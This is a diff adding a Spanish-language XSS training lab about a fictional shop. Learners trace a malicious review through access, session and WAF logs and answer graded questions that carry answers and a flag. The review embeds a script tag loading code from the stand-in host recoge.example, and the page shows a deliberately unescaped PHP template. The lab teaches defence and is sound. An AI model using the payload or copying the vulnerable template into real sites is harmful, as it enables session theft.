@@ -1,0 +1,171 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>La reseña de cinco estrellas · Labs N4zar1</title>
+<meta name="description" content="Reto de XSS: una reseña de cinco estrellas en una tienda online ficticia se llevó la sesión de quien la leía. Lee los registros como un analista SOC: la reseña trampa, adónde llamaba, por qué el WAF no la paró, la sesión robada y el arreglo que lo cierra.">
+<meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#0a0a0a" media="(prefers-color-scheme: dark)">
+<link rel="icon" type="image/png" href="../assets/favicon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="../assets/lab.css">
+<style>.evidence h3{margin:0;font:inherit}.evidence td{word-break:break-all}pre.code{margin:0;padding:16px 18px;overflow:auto;font:500 14px/1.6 var(--mono);color:var(--fg2)}pre.code b{color:var(--alert);font-weight:700}</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <a class="brand" href="../index.html"><img class="b" src="../assets/avatar.jpg" alt="" width="30" height="30">N4zar1 <span class="sub">Labs</span></a>
+    <nav><a class="opc" href="../index.html">Todos los labs</a><a data-goatcounter-click="ir-a-tienda" href="https://tienda.n4zar1.com">Tienda</a></nav>
+  </header>
+
+  <h1>La reseña de cinco estrellas</h1>
+  <p class="lede">Medio · ~12 min · Basado en el vídeo «No sabía tu contraseña. Dejé un comentario… y entré en tu cuenta (XSS)».</p>
+
+  <div class="brief">
+    <p><b>El caso.</b> Tienda Luna, una tienda online ficticia (tienda-luna.example). Jueves 26/11. Lucía llama enfadada: alguien ha cambiado la dirección de envío de su cuenta y ha hecho un pedido con su tarjeta guardada. Ella no ha dado su contraseña a nadie y tiene activada la verificación en dos pasos. Te pasan el registro de accesos de la web, las sesiones, el WAF y un trozo del código.</p>
+    <p><b>Tu misión:</b> encuentra la reseña trampa, adónde llamaba, por qué el WAF no la paró, desde dónde usaron la sesión de Lucía, a cuántos clientes afectó y qué arreglo lo cierra. Chuleta: en HTML, <code>&lt;script&gt;</code> es código que el navegador ejecuta; <code>&amp;lt;</code> es el signo <code>&lt;</code> pintado como texto. Ojo: no todo <code>&lt;</code> es un ataque.</p>
+  </div>
+
+  <div class="evidence" id="ev1">
+    <div class="hd"><h3>1 · access.log de la web · 26/11 (la app apunta el usuario y, en las reseñas, el texto enviado)</h3>
+      <span class="tools"><input id="q1" placeholder="Buscar (IP, usuario, ruta…)" aria-label="Buscar en el registro de accesos"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev2">
+    <div class="hd"><h3>2 · Sesiones · 26/11 (identificador de sesión abreviado)</h3>
+      <span class="tools"><input id="q2" placeholder="Buscar (sesión, usuario, IP…)" aria-label="Buscar en las sesiones"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev3">
+    <div class="hd"><h3>3 · WAF (ModSecurity + OWASP CRS) · registro del 26/11</h3>
+      <span class="tools"><input id="q3" placeholder="Buscar (IP, regla…)" aria-label="Buscar en el registro del WAF"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev4">
+    <div class="hd"><h3>4 · La web por dentro: la plantilla de reseñas, la cookie y el WAF</h3></div>
+    <pre class="code">&lt;!-- producto.php: así pinta cada reseña --&gt;
+&lt;p class="autor"&gt;&lt;?= htmlspecialchars($r['autor']) ?&gt;&lt;/p&gt;
+<b>&lt;p class="texto"&gt;&lt;?= $r['texto'] ?&gt;&lt;/p&gt;</b>   &lt;!-- «sin escapar para que salgan las negritas del editor» --&gt;
+
+// login.php: la cookie de sesión
+<b>setcookie('sesion', $id, ['secure' =&gt; true, 'samesite' =&gt; 'Lax']);</b>
+// (no hay cabecera Content-Security-Policy en ninguna página)
+
+# modsecurity.conf
+SecRuleEngine On
+<b>SecRule REQUEST_URI "@beginsWith /producto/" "id:1001,phase:1,pass,nolog,ctl:ruleEngine=DetectionOnly"</b>
+# puesta el 20/11 «porque el editor de reseñas daba falsos positivos»</pre>
+  </div>
+
+  <div class="tasks" id="tasks"></div>
+
+  <div class="win" id="win">
+    <h2>Reto completado</h2>
+    <p>Bandera: <code id="flag"></code></p>
+    <p>Lo que haría Tienda Luna: escapar la salida de las reseñas (<code>htmlspecialchars</code>, o la plantilla con el escape automático activado) y, si quiere negritas, un saneador de HTML con lista blanca (OWASP XSS Prevention Cheat Sheet); marcar la cookie de sesión como <code>HttpOnly</code>; añadir una CSP con <code>script-src 'self'</code> sin <code>'unsafe-inline'</code>; quitar la exclusión 1001 del WAF y afinar solo la regla que daba el falso positivo; borrar la reseña, cerrar todas las sesiones abiertas (las robadas dejan de valer), revertir la dirección de Lucía, anular el pedido y avisar a los clientes afectados. Y nada de esto se prueba fuera de sistemas propios o sin permiso.</p>
+    <button class="btn ghost" id="reset">Reiniciar el reto</button>
+  </div>
+
+  <footer class="foot"><span>Tienda, personas, dominios, IPs y sesiones ficticios; nada sale de tu navegador. Por Nazarí · N4zar1</span><a href="../index.html">← Volver a los labs</a></footer>
+</div>
+<script src="../assets/lab.js"></script>
+<script>
+const $ = id => document.getElementById(id);
+const q = () => (r, v) => !v || r.join(' ').toLowerCase().includes(v.toLowerCase());
+const TRAMPA = '¡Me encantó! Llegó en 24 h. ★★★★★ <script src="https://recoge.example/r.js"><\/script>';
+
+makeTable({
+  el: $('ev1'),
+  cols: ['Hora', 'IP', 'Petición', 'Usuario', 'Texto enviado', 'Código', 'User-Agent'],
+  rows: [
+    ['10:05:12', '198.51.100.40', 'POST /producto/88/resenas', 'ana_p', 'Calidad < precio, pero suenan muy bien', '201', 'Mozilla/5.0 (Windows NT 10.0) Chrome'],
+    ['10:12:07', '203.0.113.77', 'POST /producto/88/resenas', 'marta_88', TRAMPA, '201', 'Mozilla/5.0 (X11; Linux x86_64) Firefox'],
+    ['10:13:30', '192.0.2.15', 'GET /producto/12', 'jorge', '-', '200', 'Mozilla/5.0 (Macintosh) Safari'],
+    ['10:15:31', '198.51.100.23', 'GET /producto/88', 'lucia', '-', '200', 'Mozilla/5.0 (Linux; Android 14) Chrome'],
+    ['10:16:10', '192.0.2.61', 'GET /producto/88', 'pablo', '-', '200', 'Mozilla/5.0 (iPhone) Safari'],
+    ['10:17:02', '203.0.113.77', 'GET /cuenta', 'lucia', '-', '200', 'Mozilla/5.0 (X11; Linux x86_64) Firefox'],
+    ['10:17:40', '203.0.113.77', 'POST /cuenta/direccion', 'lucia', '-', '200', 'Mozilla/5.0 (X11; Linux x86_64) Firefox'],
+    ['10:18:05', '203.0.113.77', 'POST /pedido', 'lucia', '-', '201', 'Mozilla/5.0 (X11; Linux x86_64) Firefox'],
+    ['10:19:12', '203.0.113.77', 'GET /cuenta', 'pablo', '-', '200', 'Mozilla/5.0 (X11; Linux x86_64) Firefox'],
+    ['10:20:30', '198.51.100.40', 'GET /producto/88', 'ana_p', '-', '200', 'Mozilla/5.0 (Windows NT 10.0) Chrome'],
+    ['10:24:51', '192.0.2.15', 'POST /carrito', 'jorge', '-', '200', 'Mozilla/5.0 (Macintosh) Safari'],
+  ],
+  cls: r => r[1] === '203.0.113.77' ? 'w' : '',
+  filters: [{el: $('q1'), test: q()}],
+});
+
+makeTable({
+  el: $('ev2'),
+  cols: ['Hora', 'Usuario', 'Sesión', 'IP', 'Navegador', 'Evento'],
+  rows: [
+    ['09:58:44', 'lucia', 'sesion=8f3a…c41', '198.51.100.23', 'Chrome · Android', 'inicio de sesión (contraseña + 2FA)'],
+    ['10:02:10', 'pablo', 'sesion=27bd…e09', '192.0.2.61', 'Safari · iPhone', 'inicio de sesión (contraseña)'],
+    ['10:04:55', 'ana_p', 'sesion=c1d0…77a', '198.51.100.40', 'Chrome · Windows', 'inicio de sesión (contraseña)'],
+    ['10:15:31', 'lucia', 'sesion=8f3a…c41', '198.51.100.23', 'Chrome · Android', 'uso'],
+    ['10:16:10', 'pablo', 'sesion=27bd…e09', '192.0.2.61', 'Safari · iPhone', 'uso'],
+    ['10:17:02', 'lucia', 'sesion=8f3a…c41', '203.0.113.77', 'Firefox · Linux', 'uso (sin inicio de sesión previo desde esta IP)'],
+    ['10:19:12', 'pablo', 'sesion=27bd…e09', '203.0.113.77', 'Firefox · Linux', 'uso (sin inicio de sesión previo desde esta IP)'],
+    ['10:20:30', 'ana_p', 'sesion=c1d0…77a', '198.51.100.40', 'Chrome · Windows', 'uso'],
+  ],
+  cls: r => r[3] === '203.0.113.77' ? 'w' : '',
+  filters: [{el: $('q2'), test: q()}],
+});
+
+makeTable({
+  el: $('ev3'),
+  cols: ['Hora', 'IP', 'URI', 'Regla', 'Mensaje', 'Acción'],
+  rows: [
+    ['10:05:12', '198.51.100.40', '/producto/88/resenas', '-', '-', 'pass'],
+    ['10:12:07', '203.0.113.77', '/producto/88/resenas', '941100', 'XSS Attack Detected via libinjection', 'detectado (solo aviso)'],
+    ['10:12:07', '203.0.113.77', '/producto/88/resenas', '941110', 'XSS Filter - Category 1: Script Tag Vector · Matched Data: <script found within ARGS:texto', 'detectado (solo aviso)'],
+  ],
+  cls: r => r[3] !== '-' ? 'w' : '',
+  filters: [{el: $('q3'), test: q()}],
+});
+
+runLab('xss-comentario', [
+  {q: '¿Qué usuario dejó la reseña trampa?', type: 'text', ph: 'usuario',
+   accept: a => norm(a).replace(/\s|@/g, '') === 'marta_88',
+   hint: 'Evidencia 1: mira el texto de las reseñas enviadas (POST …/resenas).',
+   explain: '<b>marta_88</b>, desde <code>203.0.113.77</code> a las 10:12:07. Detrás de las cinco estrellas hay una etiqueta <code>&lt;script&gt;</code>: la tienda la guarda y la pinta tal cual a cada persona que abre el producto (XSS almacenado).'},
+  {q: '¿De qué dominio cargaba el código esa reseña?', type: 'text', ph: 'dominio',
+   accept: a => norm(a).replace(/\s|https?:\/\/|\/.*$/g, '') === 'recoge.example',
+   hint: 'Mira el atributo src de la etiqueta script.',
+   explain: '<b>recoge.example.</b> El navegador de cada visitante descarga y ejecuta <code>r.js</code> desde ahí, con los permisos de tienda-luna.example. Es lo que bloquearía una CSP con <code>script-src \'self\'</code>: solo se ejecutaría código de la propia tienda.'},
+  {q: 'A las 10:05, ana_p también envió un <code>&lt;</code> en su reseña. ¿Es un ataque?', type: 'choice',
+   options: ['Sí: cualquier < en una reseña es un ataque', 'No: es un «menor que» en una frase normal y el WAF no avisó. Pero si la web escapara la salida, ni siquiera habría que preguntárselo', 'No, porque usa Windows'], correct: 1,
+   explain: '<b>Es una clienta normal.</b> «Calidad &lt; precio» no abre ninguna etiqueta ni llama a nada, y el WAF lo deja pasar sin alerta. Escapando la salida, ese <code>&lt;</code> se pinta como <code>&amp;lt;</code> y se ve igual de bien: no hace falta prohibir símbolos.'},
+  {q: '¿Qué regla del WAF vio la etiqueta script en el campo «texto»?', type: 'text', ph: 'número de regla',
+   accept: a => ['941110', '941100'].includes(norm(a).replace(/\s|id/g, '')),
+   hint: 'Evidencia 3, 10:12:07.',
+   explain: '<b>941110</b> («Script Tag Vector», encontró <code>&lt;script</code> en <code>ARGS:texto</code>) y también <b>941100</b> (XSS por libinjection). Las dos son del OWASP Core Rule Set, en REQUEST-941-APPLICATION-ATTACK-XSS.conf.'},
+  {q: 'El WAF está en <code>SecRuleEngine On</code>. ¿Por qué no bloqueó la reseña?', type: 'choice',
+   options: ['Porque el atacante usó una VPN', 'Porque la regla 1001 pone el WAF en «solo detección» para todo lo que empieza por /producto/, para quitar unos falsos positivos', 'Porque las reglas de OWASP no detectan XSS'], correct: 1,
+   wrong: '✗ Mira la columna «Acción» de la evidencia 3 y la configuración de la evidencia 4.',
+   explain: '<b>Una exclusión demasiado amplia.</b> Para callar los falsos positivos del editor de reseñas, alguien apagó el bloqueo en toda la ruta /producto/. Lo correcto es afinar solo la regla que molestaba, en el parámetro concreto, y no dejar sin defensa una zona entera. Las alertas estaban ahí desde las 10:12: un analista las habría visto.'},
+  {q: '¿Desde qué IP se usó la sesión de Lucía sin que ella iniciara sesión allí?', type: 'text', ph: 'IP',
+   accept: a => norm(a).replace(/\s/g, '') === '203.0.113.77',
+   hint: 'Evidencia 2: busca su identificador de sesión.',
+   explain: '<b>203.0.113.77</b>, la misma IP que dejó la reseña. A las 10:15:31 Lucía abre el producto desde su Android (<code>198.51.100.23</code>) y 91 segundos después su misma sesión, <code>8f3a…c41</code>, aparece desde Firefox en Linux sin ningún inicio de sesión. No hizo falta su contraseña ni su 2FA: la cookie ya era la prueba de que había entrado.'},
+  {q: '¿Cuántos clientes distintos perdieron la sesión a manos de esa IP?', type: 'text', ph: 'número',
+   accept: a => ['2', 'dos'].includes(norm(a).replace(/\s/g, '')),
+   hint: 'Evidencia 2: cuenta los usuarios con sesiones usadas desde 203.0.113.77. ¿Quién abrió el producto 88 después de las 10:12?',
+   explain: '<b>Dos: lucia y pablo.</b> Los dos abrieron el producto 88 después de que se publicara la reseña. ana_p lo abrió a las 10:20, pero su sesión no aparece desde la IP del atacante (por ahora: hay que revisarla igual). jorge no visitó ese producto.'},
+  {q: '¿Qué atributo de la cookie habría impedido que el script la leyera?', type: 'text', ph: 'atributo',
+   accept: a => norm(a).replace(/[\s-]/g, '') === 'httponly',
+   hint: 'Evidencia 4: mira qué opciones tiene setcookie y cuál falta.',
+   explain: '<b>HttpOnly.</b> Una cookie con <code>HttpOnly</code> viaja con cada petición, pero JavaScript no puede leerla con <code>document.cookie</code>. El script se habría ejecutado igual, pero no se habría llevado la llave de la sesión.'},
+  {q: '¿Qué cambio en producto.php cierra el agujero de raíz?', type: 'choice',
+   options: ['Borrar la reseña y bloquear la IP 203.0.113.77', 'Escapar la salida: htmlspecialchars($r[\'texto\']) (o un saneador con lista blanca si se quieren negritas), para que lo que escribe el cliente se pinte como texto', 'Pedir a los clientes que cambien la contraseña'], correct: 1,
+   wrong: '✗ Eso ayuda hoy, pero mañana llegará otra reseña igual. Mira qué línea pinta el texto tal cual.',
+   explain: '<b>Escapar la salida.</b> Es la primera defensa de la OWASP XSS Prevention Cheat Sheet: con <code>htmlspecialchars</code>, <code>&lt;script&gt;</code> se convierte en <code>&amp;lt;script&amp;gt;</code> y se ve como texto. CSP y HttpOnly son capas extra. Cambiar la contraseña no echa al atacante: hay que cerrar las sesiones abiertas.'},
+], 'N4{la_resena_es_solo_texto}');
+</script>
+<script data-goatcounter="https://n4zar1.goatcounter.com/count" async src="https://gc.zgo.at/count.js"></script>
+</body>
+</html>
